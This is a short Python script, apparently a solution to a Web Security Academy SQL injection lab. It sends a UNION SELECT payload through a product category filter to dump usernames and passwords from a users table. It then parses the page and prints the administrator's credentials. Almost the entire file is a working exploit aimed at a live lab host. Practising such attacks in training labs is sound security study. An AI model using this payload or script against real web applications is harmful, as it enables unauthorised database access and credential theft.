from bs4 import BeautifulSoup
import requests

# LAB06 SQLi
# Author: AFANX
# 09/08/2024

def info(msg):
    print("[!] " + str(msg))

def error(msg):
    print("[-] " + str(msg))

def success(msg):
    print("[+] " + str(msg))

def url_encode(str_payload):
    url_encode_result = "+"
    for i in str_payload.split(" "):
        url_encode_result += i + '+'
    return url_encode_result[:len(url_encode_result)-1]

def leak_creds():
    admin_creds = []
    url = "https://0ade0087034fc1e180c51c9400470042.web-security-academy.net/filter?category=Gifts"
    sqli = url_encode("' UNION SELECT NULL, username || ':' || password FROM users--")

    payload = url + sqli

    info(payload)
    response = requests.get(payload)
    info(response.status_code)

    soup = BeautifulSoup(response.text, "html.parser")

    for j in soup.find_all('th'):
        if(j.text.split(":")[0] == 'administrator'):
            admin_creds.append(j.text)
    
    for i in admin_creds:
        success(i.split(':'))

def main():
    leak_creds()

if __name__ == "__main__":
    main()